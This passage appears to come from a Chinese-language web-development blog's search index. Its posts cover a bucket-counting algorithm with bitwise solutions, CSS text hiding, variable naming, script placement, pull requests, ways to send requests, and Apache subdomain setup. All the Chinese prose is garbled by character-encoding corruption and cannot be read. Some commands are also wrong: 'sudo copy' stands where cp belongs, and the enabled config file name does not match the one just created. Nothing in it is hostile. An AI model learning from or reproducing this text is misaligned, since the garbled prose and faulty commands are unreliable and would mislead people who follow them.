findMaxBucket(capacity) // æŠŠæ°´æ¡¶è£æ»¿å¾Œï¼Œæ›´æ–°æ°´é‡ capacity -= 2**max // è¨ˆæ•¸å™¨ + 1 count++ } // å°å‡ºå¹¾å€‹æ°´æ¡¶ console.log(count)}function findMaxBucket(n) { /* æ‰¾å‡ºæœ€å¤§å€¼ï¼Œæœ€å¤§å€¼æœ‰å…©å€‹å¯èƒ½ï¼š 1. è¶…é nï¼Œä»£è¡¨å‰ä¸€å€‹æ•¸å­—å°±æ˜¯æœ€å¤§å€¼ 2. ç­‰æ–¼ nï¼Œä»£è¡¨é€™å€‹æ•¸å­—å°±æ˜¯æœ€å¤§å€¼ */ for (let i=0; i&lt;=31; i++) { // ç­‰æ–¼ n if(2**i === n) { return i // è¶…é n } else if (2**i &gt; n) { return i-1 } }}solve(['20']) // 2 é€™æ¨£åšçš„ç¼ºé»æ˜¯ã€Œæœƒæœ‰ä¸åŒçš„å›å‚³å€¼ã€ï¼š è¶…é n çš„æƒ…æ³å›å‚³ i - 1 ç­‰æ–¼ n çš„æƒ…æ³å›å‚³ i åœ¨ findMaxBucket è£¡é¢ï¼Œå› ç‚ºå…©ç¨®æƒ…æ³çš„å›å‚³å€¼ä¸åŒï¼Œæ‰€ä»¥éœ€è¦å¤šåšä¸€å±¤åˆ¤æ–·ã€‚ å…¶å¯¦å¯ä»¥åéä¾†æ€è€ƒï¼šä¸è¦ã€Œå¾å°æ‰¾åˆ°å¤§ã€ï¼Œè€Œæ˜¯ã€Œå¾å¤§æ‰¾åˆ°å°ã€ åœ¨å¾å°æ‰¾åˆ°å¤§æ™‚ï¼Œå› ç‚ºå¯¦éš›ä¸Šè¦çš„æ°´æ¡¶æ˜¯ã€Œå‰ä¸€å€‹ï¼ˆi - 1ï¼‰ã€ï¼Œæ‰€ä»¥å¾—å›å‚³ i - 1ï¼›ä½†å¦‚æœæ˜¯å¾å¤§æ‰¾åˆ°å°ï¼Œå¯¦éš›ä¸Šè¦çš„æ°´æ¡¶æ­£å¥½å°±æ˜¯ iï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥å›å‚³ iã€‚ ä¹Ÿå°±æ˜¯èªªï¼Œä¸ç®¡å°æ–¼æˆ–ç­‰æ–¼çš„æƒ…æ³ï¼Œå›å‚³çš„å€¼éƒ½æ˜¯ iï¼Œå°±ä¸ç”¨å¤šå¯«ä¸€å±¤åˆ¤æ–·ï¼Œè€Œæ˜¯ç›´æ¥åˆ©ç”¨ &lt;= ä¾†åˆ¤æ–·å³å¯ã€‚ å¯ä»¥åƒè€ƒä¸‹é¢çš„è§£æ³•ã€‚ è°æ˜ä¸€é»çš„è§£æ³•æŠŠå‰›å‰›çš„ä½œæ³•ä¿®æ­£ä¸€ä¸‹ï¼Œå¯«å‡ºæ›´ç°¡æ½”çš„ç¨‹å¼ç¢¼ï¼š n = æ°´é‡ count = æ°´æ¡¶æ•¸é‡ éæ­· 2^31 ~ 2^0 æ¯ç•¶æ‰¾åˆ°æ¯” n å°çš„æ•¸å­—ï¼Œæ›´æ–° n çš„å€¼ï¼Œcount++ é‡è¤‡ 4-5ï¼Œç›´åˆ° n ç‚º 0 12345678910111213141516171819202122232425262728function solve(lines) { // æ‰€éœ€æ°´é‡ let capacity = Number(lines[0]) // è¨ˆæ•¸å™¨ let count = 0 // åªè¦ capacity &gt; 0ï¼Œå°±æœƒä¸€ç›´åŸ·è¡Œ while (capacity) { // æ‰¾å‡ºæœ€å¤§çš„æ°´æ¡¶ let max = findMaxBucket(capacity) // æŠŠæ°´æ¡¶è£æ»¿å¾Œï¼Œæ›´æ–°æ°´é‡ capacity -= 2**max // è¨ˆæ•¸å™¨ + 1 count++ } // å°å‡ºå¹¾å€‹æ°´æ¡¶ console.log(count)}function findMaxBucket(n) { // å¾å¤§æ‰¾åˆ°å° for (let i=31; i&gt;=0; i--) { // ä¸ç®¡å°æ–¼ç­‰æ–¼çš„å›å‚³å€¼éƒ½æ˜¯ i if(2**i &lt;= n) { return i } }}solve(['20']) // 2 æœ‰è¶£çš„åšæ³•å¦‚æœä½ æ‡‚äºŒé€²ä½çš„è©±ï¼Œä½ æœƒç™¼ç¾é€™ä¸€é¡ŒèƒŒå¾Œå…¶å¯¦åªæ˜¯åœ¨å• ã€Œn è½‰æˆäºŒé€²ä½å¾Œæœ‰å¹¾å€‹ 1ã€ï¼Ÿ ä»¥ 20 ç‚ºä¾‹ï¼Œ20 çš„äºŒé€²ä½æ˜¯ 10100ã€‚ä½ ä»”ç´°çœ‹çš„è©±å°±æœƒç™¼ç¾ 1 å‡ºç¾çš„æ¬¡æ•¸æ­£å¥½å°±æ˜¯æœ€ä½³çš„æ°´æ¡¶æ•¸é‡ï¼Œæ‰€ä»¥è§£æ³•å°±æœƒæ˜¯ï¼š n = æ°´é‡ count = æ°´æ¡¶æ•¸é‡ æŠŠ n è½‰æˆäºŒé€²ä½ï¼ˆå­—ä¸²ï¼‰ éæ­· n çš„æ¯ä¸€å€‹å­—å…ƒï¼Œç®—å‡ºç¸½å…±æœ‰å¹¾å€‹ 1 123456789101112131415161718192021222324252627function solve(lines) { // æ‰€éœ€æ°´é‡ let capacity = Number(lines[0]) // è¨ˆæ•¸å™¨ let count = 0 // è½‰æˆäºŒé€²ä½ let binaryString = transToBinary(capacity) // éæ­·äºŒé€²ä½å€¼ï¼Œç®—å‡ºæœ‰å¹¾å€‹ 1 for(let i=0; i&lt;binaryString.length; i++) { if(binaryString[i] === '1') count++ } console.log(count)}function transToBinary(n) { let result = '' /* åªè¦ n &gt; 0ï¼Œç¹¼çºŒæŠŠ n é™¤ä»¥ 2 æ±‚é¤˜æ•¸ æŠŠæ¯ä¸€æ¬¡é™¤ä»¥ 2 çš„é¤˜æ•¸æ‹¼æ¥åˆ° result */ while(n) { result = (n%2) + result // è¦è¨˜å¾—å»æ‰å°æ•¸é» n = Math.floor(n/2) } return result}solve(['20']) // 2 æé†’ä¸€ä¸‹ï¼Œlet binaryString = transToBinary(capacity) å¯ä»¥å¯«æˆï¼š let binaryString = capacity.toString(2)ï¼Œä¸ç”¨åƒæˆ‘ä¸€æ¨£å‚»å‚»çš„åšè½‰æ›ã€‚ æ‰€ä»¥é€™ä¸€é¡Œå°±é€™æ¨£è§£æ±ºå›‰ã€‚ é‚„æœ‰æ›´é…·çš„ä½œæ³•ï¼Ÿå…¶å¯¦å°±æ˜¯å‰›å‰›çš„å»¶ä¼¸ï¼Œä½ å¯ä»¥ç›´æ¥åˆ©ç”¨ã€Œä½ç§»ã€å’Œã€Œä½å…ƒé‹ç®—ã€ä¾†è¨ˆç®—ä¸€å€‹æ•¸å­—æœ‰å¹¾å€‹ 1ã€‚ æ³¨æ„ï¼šç”¨é€™å€‹æ–¹æ³•å°±ä¸ç”¨å†æŠŠæ•¸å­—å…ˆè½‰æˆäºŒé€²ä½äº†ï¼Œå› ç‚ºä½ç§»è·Ÿä½å…ƒé‹ç®—æœƒä»¥ã€Œåé€²ä½ã€ä¾†è§£ææ•¸å­—ã€‚å¦‚æœä½ åˆè½‰æˆäºŒé€²ä½ï¼Œä¾‹å¦‚ 20 = 10100ï¼Œé€™æ™‚å€™ 10100 å°±æœƒè¢«ç•¶ä½œåé€²ä½ä¾†è§£æã€‚ æª¢æŸ¥æœ€å¾Œä¸€å€‹æ•¸å­—æ˜¯ä¸æ˜¯ 1 n &amp; 1 æ˜¯çš„è©±æŠŠ count++ æ›´æ–° n çš„å€¼ n &gt;&gt;= 1 12345678910111213141516function solve(lines) { // æ‰€éœ€æ°´é‡ let capacity = Number(lines[0]) // è¨ˆæ•¸å™¨ let count = 0 // capacity = 0 æ™‚æ‰æœƒåœæ­¢ while(capacity) { // åš AND ä½å…ƒé‹ç®— if(capacity &amp; 1) { count++ } // åˆ©ç”¨ä½ç§»æ›´æ–° capacity çš„å€¼ capacity &gt;&gt;= 1 } console.log(count)}","link":"/2021/12/22/how-many-buckets/"},{"title":"ä¸€äº› google çš„å°æŠ€å·§","text":"é †æ‰‹è¨˜ä¸‹ä¾† æ’é™¤ä¸è¦çš„çµæœï¼ˆ-ï¼‰å‡è¨­æˆ‘æƒ³æ‰¾è²·ä¸€é€ä¸€ï¼š ä½†æˆ‘ä¸æƒ³è¢«æ˜Ÿå·´å…‹æ´—ç‰ˆï¼Œæˆ‘å¯ä»¥æ”¹æœå°‹ è²·ä¸€é€ä¸€ -æ˜Ÿå·´å…‹ï¼ˆè¦ç©ºä¸€æ ¼ï¼‰ï¼š é€™æ¨£å°±ä¹¾æ·¨å¤šäº†ã€‚ ä¸€å­—ä¸æ¼çš„æœå°‹ï¼ˆâ€ï¼‰ä¾‹å¦‚æˆ‘æœå°‹è±¬æ’é£¯ï¼š æˆ‘æ˜æ˜å°±æœå°‹è±¬æ’é‚„è·³å‡ºé›æ’æ˜¯æ€æ¨£ï¼Ÿæ”¹æˆ \"è±¬æ’å’–å“©é£¯\" ä¾†è®“å®ƒä¸€å­—ä¸æ¼çš„æœå°‹ï¼Œé †ä¾¿ç¸®å°ç¯„åœï¼š å¿«é€Ÿæ‰¾å»èƒŒåœ–ï¼ˆ.pngï¼‰ä¸è§£é‡‹ï¼Œä¸€å€‹æ‰¾é€æ˜åœ–çš„å¥½è¾¦æ³•ï¼Œçµ•å°å¯¦ç”¨ï¼š","link":"/2022/02/09/how-to-google/"},{"title":"å¦‚ä½•æ­£ç¢ºçš„éš±è—æ–‡å­—","text":"å¥½å¤šç¨®æ–¹æ³•ã€‚ ä½¿ç”¨æ™‚æ©Ÿèˆ‡ç”¨æ³•æœ‰äº›æ™‚å€™ç‚ºäº† HTML èªæ„æˆ–ç„¡éšœç¤™è¨­è¨ˆï¼Œæœƒåœ¨æ¨™ç±¤ä¸­å¡«å…¥ä¸€äº›æ–‡å­—å…§å®¹ï¼Œä½†å¯¦éš›ä¸Šå»ä¸æƒ³é¡¯ç¤ºé€™äº›æ–‡å­—ï¼Œé€™æ™‚å€™å°±æœƒé€é CSS ä¾†æŠŠé€™äº›æ–‡å­—å…§å®¹ä¾†éš±è—èµ·ä¾†ã€‚ ä½†æ˜¯è¦å¦‚ä½•æ­£ç¢ºåœ°éš±è—ä»–å€‘ï¼Ÿå¦‚æœæ²’æœ‰ç”¨æ­£ç¢ºçš„æ–¹æ³•ï¼Œé€™å€‹æ¨™ç±¤æœƒè¢«ç•¶ä½œä¸å­˜åœ¨ï¼Œé€²è€Œå½±éŸ¿ HTML çš„ã€Œåˆæ³•æ€§ï¼ˆValidationsï¼‰ã€ï¼Œæ‰€ä»¥æˆ‘å€‹äººçš„å»ºè­°æ˜¯é€™æ¨£å­ï¼š 1&lt;h2 class=\"hide\"&gt;ä¸€å€‹æ¨™é¡Œï¼Œä½†æˆ‘ä¸æƒ³è¦é¡¯ç¤ºå®ƒ&lt;/h2&gt; 1234567891011.hide { position: absolute; top: 0; left: 0; width: 0; height: 0; z-index: -9999; text-indent: 100%; white-space: nowrap; overflow: hidden;} ä»¥æˆ‘å€‹äººçš„å¯¦éš›ç¶“é©—ï¼Œé€™æ¨£å­çš„å¯«æ³•æ˜¯ä¸æœƒæœ‰å•é¡Œçš„ã€‚ ç°¡å–®èªªæ˜ä¸€ä¸‹å®ƒåšäº†ä»€éº¼ï¼š è¨­ç‚º absoluteï¼Œä¸¦å®šä½åˆ°å·¦ä¸Šè§’ z-index: -9999ï¼Œç¸½ä¹‹å°±æ˜¯æœ€åº•å±¤ å¯¬é«˜è¨­ç‚º 0 æœ€å¾Œä¸‰è¡Œå‰‡æ˜¯è®“æ–‡å­—è¶…å‡ºç¯„åœä¸¦éš±è— é‚£ä»€éº¼æ˜¯ä¸æ°ç•¶çš„åšæ³•ï¼Ÿ display: none visibility: hidden é€™å…©å€‹éƒ½æœƒè®“æ¨™ç±¤è¢«ç•¶ä½œä¸å­˜åœ¨ã€‚ è£œå……å¾Œä¾†é‚„ç™¼ç¾äº†ä¸€äº›æ–°çš„æ–¹æ³•ï¼Œæ‰€ä»¥ä¹Ÿè¨˜éŒ„ä¸‹ä¾†ã€‚ 12345678910.hide { position: absolute; height: 1px; width: 1px; clip: rect(1px 1px 1px 1px); clip: rect(1px, 1px, 1px, 1px); clip-path: polygon(0px 0px, 0px 0px, 0px 0px, 0px 0px); -webkit-clip-path: polygon(0px 0px, 0px 0px, 0px 0px, 0px 0px); overflow: hidden !important;} 12345.hide { position: absolute !important; top: -9999px !important; left: -9999px !important;}","link":"/2022/01/16/how-to-hide-text/"},{"title":"æƒ³éµå¾ªçš„è®Šæ•¸å‘½åæ–¹å¼","text":"ä¹‹å‰æœ‰å¯«éä¸€ç¯‡ è®Šæ•¸çš„å‘½åå“²å­¸ï¼Œä¸éå¯«çš„ä¸æ˜¯å¾ˆå®Œæ•´ã€‚æœ€è¿‘å‰›å¥½çœ‹åˆ°é€™é€™ç¯‡ æ–‡ç« ï¼Œè¦ºå¾—å¯«å¾—é‚„ä¸éŒ¯ï¼Œæ‰€ä»¥æƒ³åƒç…§å®ƒçš„å…§å®¹ä¾†æ‰“é€ è‡ªå·±çš„ coding styleã€‚ åŸºæœ¬è¦å‰‡é€™è£¡ç›´æ¥æŠŠä»¥å‰å¯«çš„è²¼éä¾†ï¼š å°å¯«é§å³°å¼ï¼ˆCamel caseï¼‰maxNumber å°å¯«é–‹é ­ï¼Œå–®å­—é€£æ¥çš„éƒ¨åˆ†è®Šæˆå¤§å°ã€‚å› ç‚ºå¾ˆåƒé§±é§çš„èƒŒï¼Œæ‰€ä»¥è¢«ç¨±ç‚ºé§å³°å¼ å¤§å¯«é§å³°å¼ï¼ˆPascal caseï¼‰MaxNumberï¼Œå°±æ˜¯é–‹é ­è®Šæˆå¤§å¯«é€™æ¨£ è›‡å‹å¼ï¼ˆSnake caseï¼‰max_valueï¼Œç”¨åº•ç·šéš”é–‹å–®å­—ï¼Œåº•ç·šåƒè›‡æ‰€ä»¥æ‰å« snake ä¸²ç‡’å¼ï¼ˆKebab caseï¼‰max-valueï¼Œç”¨ - éš”é–‹å–®å­—ï¼Œkebab æ˜¯çƒ¤è‚‰ä¸²çš„æ„æ€ï¼ˆå› ç‚ºé€™ç¨®å¯«æ³•å¾ˆåƒä¸²ç‡’ï¼‰ æ¥ä¸‹ä¾†æœƒæ ¹æ“š è®Šæ•¸ã€å¸¸æ•¸ã€å‡½æ•¸ã€é¡ï¼ˆclassï¼‰ã€é¡æˆå“¡ ä¾†åˆ†åˆ¥è§£é‡‹ä¸€ä¸‹è©²ç”¨å“ªç¨®å‘½åæ ¼å¼è·Ÿå»ºè­°æ¯”è¼ƒæ°ç•¶ã€‚ è®Šæ•¸ å‘½åæ ¼å¼ï¼šå°å¯«é§å³°å¼ å‘½åå»ºè­°ï¼šä»¥åè© ä¾†é–‹é ­ å¦å¤–æœ€å¥½å–çš„è²¼åˆ‡ä¸€é»ï¼Œåƒ lengthã€count å¾ˆæ˜é¡¯ä»£è¡¨ã€Œæ•¸å­—ã€ï¼Œè€Œ nameã€title å°±è¡¨ç¤ºã€Œå­—ä¸²ã€ã€‚ example: 123456// æ­£ç¢ºçš„å¯«æ³•let maxCount = 10let tableTitle = 'LoginTable'// ä¸æ­£ç¢ºçš„å¯«æ³•let setCount = 10let getTitle = 'LoginTable' å¸¸æ•¸ å‘½åæ ¼å¼ï¼šå…¨éƒ¨éƒ½å¤§å¯«ï¼Œç”¨ä¸‹åº•ç·šåˆ†éš”å–®å­— example: 12const MAX_COUNT = 10const URL = 'http://www.foreverz.com' å‡½æ•¸ å‘½åæ ¼å¼ï¼šå°å¯«é§å³°å¼ å‘½åå»ºè­°ï¼šä»¥å‹•è© ä¾†é–‹é ­ é™„ä¸Šä¸€äº›å¸¸è¦‹çš„ç´„å®šä¿—æˆï¼š å‹•è© æ„æ€ å›å‚³å€¼ can åˆ¤æ–·æ˜¯å¦èƒ½åŸ·è¡ŒæŸå€‹å‹•ä½œ trueï¼šå¯ä»¥ï¼Œfalseï¼šä¸å¯ä»¥ has åˆ¤æ–·æ˜¯å¦åŒ…å«æŸå€‹å€¼ trueï¼šæœ‰åŒ…å«ï¼Œfalseï¼šæ²’æœ‰åŒ…å« is åˆ¤æ–·æ˜¯å¦ç‚ºæŸå€‹å€¼ trueï¼šæœ‰ï¼Œfalseï¼šæ²’æœ‰ get å–å¾—æŸå€‹å€¼ å›å‚³å–å¾—çš„å€¼ set è¨­å®šæŸå€‹å€¼ æ²’æœ‰å›å‚³å€¼æˆ–å›å‚³æ˜¯å¦æˆåŠŸ load è®€å–è³‡æ–™ æ²’æœ‰å›å‚³å€¼æˆ–å›å‚³æ˜¯å¦æˆåŠŸå¤±æ•— example: 12345678// æ˜¯å¦å¯ä»¥é–±è®€function canRead() { return true}// å–å¾—åç¨±function getName() { return 'PeaNu'} é¡ï¼ˆclassï¼‰ å‘½åæ ¼å¼ï¼šå¤§å¯«é§å³°å¼ å‘½åå»ºè­°ï¼šä»¥åè© ä¾†é–‹é ­ example: 1234567class Person { public name: string constructor(name) { this.name = name }}const person = new Person('mevyn') é¡æˆå“¡ å…¬é–‹å±¬æ€§å’Œæ–¹æ³•ï¼šè·Ÿè®Šæ•¸å’Œå‡½æ•¸çš„å‘½åç›¸åŒã€‚ ç§æœ‰å±¬æ€§å’Œæ–¹æ³•ï¼šå‰ç¶´ç”¨ä¸‹åº•ç·šä¾†è¡¨ç¤ºï¼Œå¾Œé¢å°±ä¸€èˆ¬ä½œæ³•ã€‚ example: 12345678910111213141516class Person { // ç§æœ‰å±¬æ€§ private _name: string constructor() { } // å…¬é–‹æ–¹æ³• getName() { return this._name } // å…¬é–‹æ–¹æ³• setName() { return this._name = name }}const person = new Person()person.setName('PeaNu')person.getName() // -&gt;PeaNu è¨»è§£å¯«è¨»è§£å…¶å¯¦ä¹Ÿèƒ½æ˜¯ä¸€ç¨® coding styleã€‚ å‘½åå»ºè­°ï¼š 123// ç”¨ä¾†é¡¯ç¤ºå–®è¡Œè¨»è§£// -&gt; ç”¨ä¾†é¡¯ç¤ºè¡¨é”å¼çš„çµæœ// &gt; ç”¨ä¾†é¡¯ç¤º console çš„è¼¸å‡ºçµæœ example: 1234function test() { console.log('Hello') // &gt; Hello return 3 + 2 // -&gt; 5} å¤šè¡Œè¨»è§£çš„å»ºè­°ï¼š 12345/* * ç¬¬ä¸€è¡Œè¨»è§£ * ç¬¬äºŒè¡Œè¨»è§£ * ç¬¬ä¸‰è¡Œè¨»è§£ */","link":"/2022/01/08/how-to-name-your-variable/"},{"title":"é—œæ–¼ <script> çš„æ”¾ç½®ä½ç½®","text":"è©²çŸ¥é“çš„çŸ¥è­˜ã€‚ èˆ‰ä¾‹ä¾†èªªå¦‚æœæˆ‘å€‘æƒ³è¦å­˜å–æŸå€‹å…ƒç´ ï¼Œä½†æ²’æœ‰æŠŠ &lt;script&gt; æ”¾åœ¨å°çš„åœ°æ–¹ï¼Œçµæœå°±æœƒä¸å¦‚é æœŸã€‚ æ”¾åœ¨ &lt;head&gt; çš„æƒ…æ³HTMLï¼š 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;æ¨™é¡Œ&lt;/title&gt; &lt;script&gt; // æŠ“ &lt;div&gt; const element = document.getElementsByTagName('div')[0] // log å‡ºä¾† console.log(element) &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt;yoyoyo&lt;/div&gt; &lt;/body&gt;&lt;/html&gt; consoleï¼š 1undefined æ”¾åœ¨ &lt;/body&gt; çš„æƒ…æ³HTMLï¼š 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;æ¨™é¡Œ&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt;yoyoyo&lt;/div&gt; &lt;script&gt; // æŠ“ &lt;div&gt; const element = document.getElementsByTagName('div')[0] // log å‡ºä¾† console.log(element) &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; consoleï¼š 1&lt;div&gt;yoyoyo&lt;/div&gt; Whyï¼Ÿç•¶æ”¾åœ¨ &lt;head&gt; ä¸­ï¼ŒåŸ·è¡Œåˆ° JavaScript æ™‚ï¼Œä¸‹é¢ &lt;body&gt; å…§å®¹é‚„æ²’æœ‰ç”¢ç”Ÿï¼Œæ‰€ä»¥ç•¶ç„¶æŠ“ä¸åˆ°ä»»ä½•æ±è¥¿ã€‚ ä½†æ˜¯æ”¾åœ¨ &lt;/body&gt; å‰ï¼ŒåŸ·è¡Œåˆ° JavaScript æ™‚ï¼Œå…§å®¹å·²ç¶“ç”¢ç”Ÿå¥½äº†ï¼Œé€™æ™‚å€™å°±æŠ“çš„åˆ°æ±è¥¿ã€‚ é€™ä¹Ÿå°±æ˜¯ç‚ºä»€éº¼å¤§å®¶éƒ½ç¿’æ…£æŠŠ JavaScript å¯«åœ¨ &lt;/body&gt; å‰çš„åŸå› ã€‚","link":"/2022/01/18/how-to-place-script-tag/"},{"title":"æˆ‘æƒ³è¦ç™¼ pull request åˆ°åˆ¥äººçš„å°ˆæ¡ˆè¦æ€éº¼åšï¼Ÿ","text":"å¦‚é¡Œ æµç¨‹æˆ‘ï¼š æŠŠæª”æ¡ˆ fork åˆ°è‡ªå·±çš„ repository æŠŠ fork éä¾†çš„ repository åˆ°è‡ªå·±çš„æœ¬åœ°ç«¯ å»ºç«‹ä¸€å€‹æ–°çš„åˆ†æ”¯ï¼Œæ¥è‘—åœ¨æ”¹ä½ è¦ä¿®æ”¹çš„åœ°æ–¹ï¼ˆä¸å»ºç«‹æ–°åˆ†æ”¯ä¹Ÿå¯ä»¥ï¼Œä½†æˆ‘è¦ºå¾—é€™æ¨£æœƒæ¯”è¼ƒå¥½ï¼‰ ä¿®æ”¹å®Œå¾Œï¼Œåˆ¥å¿˜äº† commit æŠŠæ–°çš„åˆ†æ”¯çš„å…§å®¹ push å›è‡ªå·±çš„ repository åœ¨è‡ªå·±çš„ repository ä¸­çš„ Pull requests é é¢æ–°å¢ä¸€å€‹ pull request å¡«å¯«ä½ æƒ³å¯«çš„å…§å®¹ï¼Œä»¥åŠæƒ³è¦åˆä½µåˆ°ä½œè€…çš„å“ªå€‹åˆ†æ”¯ é€å‡º pull request ä½œè€…ï¼š æ”¶åˆ°æˆ‘ç™¼çš„ pull request åš Code review ç¢ºèªæ²’å•é¡Œï¼ŒæŒ‰ä¸‹åŒæ„å¾Œï¼Œå°±æœƒæŠŠæˆ‘çš„å…§å®¹åˆä½µåˆ°æˆ‘æŒ‡å®šçš„åˆ†æ”¯å» çµæŸï½ ä¸å¤ªæ‡‚çš„è©±ï¼Œåƒè€ƒä¸‹é¢çš„åœ–ç‰‡ï¼š","link":"/2021/12/13/how-to-send-a-pull-request/"},{"title":"å››ç¨®ç™¼ request çš„æ–¹æ³•","text":"ç°¡å–®è¨˜ä¸€ä¸‹ã€‚ ç›®å‰çŸ¥é“çš„å››ç¨® &lt;script src=\"...\"&gt; =&gt; ä¾‹å¦‚ google analyze åˆ†æä½¿ç”¨è€…è¡Œç‚º &lt;link href=\"....\"&gt; =&gt; æˆ‘ç›®å‰ä¹Ÿä¸çŸ¥é“æ€éº¼æ‡‰ç”¨ &lt;img src=\"...\"&gt; =&gt; Emailï¼Œå°æ–¹æ‰“é–‹ä½ çš„ä¿¡äº†å—ï¼Ÿæ˜¯èª°æ‰“é–‹ä½ çš„ä¿¡çš„ï¼Ÿ &lt;form action=\"...\"&gt; =&gt; GET æƒ³è¦çš„è³‡æ–™ï¼ŒPOST è¦çµ¦å¾Œç«¯çš„è³‡æ–™","link":"/2022/01/06/how-to-send-request/"},{"title":"æ€éº¼è¨­å®šå­ç¶²åŸŸï¼Ÿ","text":"ç´€éŒ„ä¸€ä¸‹ã€‚ ç°¡è¿°åœ¨äº¤æ€éº¼è¨­ä¹‹å‰ï¼Œå…ˆä»‹ç´¹ä¸€ä¸‹ä»€éº¼ã€Œå­ç¶²åŸŸã€å’Œã€Œå­ç›®éŒ„ã€çš„å·®åˆ¥ï¼š http://peanu.tw/message-board é€™ç¨®é€é /è³‡æ–™å¤¾ çš„ç¶²å€å°±å«åšå­ç›®éŒ„ã€‚ http://message-board.peanu.tw é€™ç¨®åœ¨ peanu å‰é¢åŠ ä¸Š message-board çš„ç¶²å€å°±å«åšå­ç¶²åŸŸã€‚ è‡³æ–¼é€™å…©ç¨®æœ‰ä»€éº¼å·®ï¼Ÿå¯ä»¥åƒè€ƒé€™ç¯‡ï¼šå­ç¶²åŸŸå¥½é‚„æ˜¯å­ç›®éŒ„å¥½ï¼Ÿæ¶è¨­éƒ¨è½æ ¼ã€æ–°ç¶²ç«™å¿…å‚™è©•ä¼° å¦å¤–å†è£œå……ä¸€ä¸‹ï¼Œé—œæ–¼ã€Œç¶²å€çš„å±¤ç´šã€ï¼Œå¯ä»¥å…ˆåƒè€ƒé€™å¼µåœ–ï¼š çœ‹ç¶²å€çš„é †åºè¦ã€Œç”±å¾Œå¾€å‰çœ‹ã€ï¼Œä»¥ http://message-board.peanu.tw ä¾†èªªï¼š tw æ˜¯ç¬¬ä¸€å±¤ç¶²åŸŸåç¨±ï¼Œå¯æ›¿æ›æˆ org com ä¹‹é¡çš„ peanu æ˜¯ç¬¬äºŒå±¤ç¶²åŸŸåç¨±ï¼Œå°±æ˜¯ä½ è²·ç¶²åŸŸçš„æ™‚å€™è‡ªå·±æŒ‘çš„éƒ¨åˆ† message-board æ˜¯å­ç¶²åŸŸ http ä»£è¡¨ HTTP é€™å€‹å”å®š OKï¼Œæœ‰é€™å€‹åŸºç¤çŸ¥è­˜å¾Œå°±å¯ä»¥ä¾†è«‡è¦æ€éº¼è¨­å®šäº†ã€‚ è¦è¨­å®šå­ç¶²åŸŸå¾—åšå…©ä»¶äº‹ï¼š å»è™›æ“¬ä¸»æ©Ÿï¼ˆæˆ‘æ˜¯ Ubuntuï¼‰ä¿®æ”¹ Apache Vitural Host çš„å…§å®¹ å»è²·ç¶²åŸŸçš„åœ°æ–¹é‡æ–°è¨­å®š ä¿®æ”¹ Apache Vitural Hosté€£åˆ°ä½ çš„ä¸»æ©Ÿå¾Œï¼Œå…ˆç§»å‹•åˆ°é€™å€‹åœ°æ–¹ï¼Œè£¡é¢æœƒæ”¾ vitural host çš„è¨­å®šæª”ï¼š 1cd /etc/apache2/sites-available/ ç”¨ ls å¾Œæœƒçœ‹åˆ° 000-default.confï¼Œé€™å€‹æ˜¯é è¨­çš„è¨­å®šæª”ã€‚æˆ‘å€‘è¦æ‹¿å®ƒä¾†å¯«ä¸€ä»½æ–°çš„ï¼Œæ‰€ä»¥è¤‡è£½ä¸€ä»½ä¸¦å‘½åç‚º message-board.confï¼š 1sudo copy 000-default.conf message-board.conf æ¥è‘—æ‰“é–‹è¨­å®šæª”ä¾†ä¿®æ”¹ï¼š é™„è¨»ï¼šnano æ˜¯ä¸€å€‹ Unix ç³»çµ±çš„æ–‡å­—ç·¨è¼¯å™¨ 1sudo nano message-board.conf æ‰“é–‹ä¾†æœƒåƒé€™æ¨£ï¼š æˆ‘ä¸€é–‹å§‹æ‰“é–‹ä¹Ÿæƒ³èªªé€™å•¥ï¼Ÿvim çš„çªè®Šç¨®ï¼Ÿ ä½†ä»”ç´°çœ‹æœƒç™¼ç¾å¹¾ä¹éƒ½æ˜¯ ^ é–‹é ­ï¼Œè€Œ ^ ä»£è¡¨ Ctrl éµï¼Œæ‰€ä»¥ ^G = Ctrl + G ï¼Œé€™æ¨£æ‡‰è©²æœƒç”¨äº†å§ï¼Ÿ æ¥ä¸‹ä¾†è¦è¨­å®šçš„åœ°æ–¹åªæœ‰å…©å€‹ï¼š ServerName &lt;ä½ æƒ³è¦çš„ç¶²å€&gt; DocumentRoot &lt;ç¶²å€å°æ‡‰åˆ°çš„è·¯å¾‘&gt; ä¸å¤ªæ‡‚å¾—è©±ä½ å°±åƒè€ƒä¸Šé¢çš„åœ–ç‰‡ï¼ŒæŠ„å®ƒçš„å…§å®¹å°±å¥½äº†ã€‚ æ”¹å®Œä»¥å¾Œè¨˜å¾—å­˜æª”ï¼Œç„¶å¾Œè¦è¼¸å…¥ä¸€æ®µæŒ‡ä»¤ä¾†å•Ÿç”¨å®ƒï¼š 1sudo a2ensite restaurant.conf çœ‹åˆ°å›å‚³ Enabling site message-board. å°±ä»£è¡¨æˆåŠŸäº†ã€‚ è¨­å®šå®Œå¾Œè¦é‡æ–°å•Ÿå‹• Apache2ï¼š 1sudo service apache2 restart Apache çš„éƒ¨åˆ†åˆ°é€™é‚Šå°± OK å›‰ã€‚ é‡æ–°è¨­å®šç¶²åŸŸæˆ‘çš„ç¶²åŸŸæ˜¯åœ¨ gandi è²·çš„ï¼Œæ‰€ä»¥é€™é‚Šæ‹¿å®ƒä¾†èªªæ˜ã€‚ æŒ‰ä¸‹æ–°å¢ç´€éŒ„ è¨­å®šå…§å®¹ åç¨±çš„éƒ¨åˆ†å°±æ˜¯ã€Œå­ç¶²åŸŸã€ï¼Œä¸»æ©Ÿåç¨±å‰‡æ˜¯ã€Œç¶²åŸŸåç¨±ã€ï¼ˆè¨˜å¾—çµå°¾è¦åŠ ä¸Š .ï¼‰ æŒ‰ä¸‹å»ºç«‹å¾Œå°±æˆåŠŸäº†ã€‚æ¥è‘—å°±èƒ½ç”¨ http://message-board.peanu.tw ä¾†é€£å›‰ã€‚ æœ€å¾Œè£œä¸€æ®µè¨­å®šæ™‚ç¢°åˆ°çš„éŒ¯èª¤åœ¨é‡æ–°å•Ÿå‹• Apache2 æ™‚å™´äº†ä¸€æ®µéŒ¯èª¤ï¼š 12Job for apache2.service failed.See \"systemctl status apache2.service\" and \"journalctl -xe\" for details. å®ƒè·Ÿä½ èªªé‡å•Ÿå¤±æ•—ï¼Œè¦ä½ 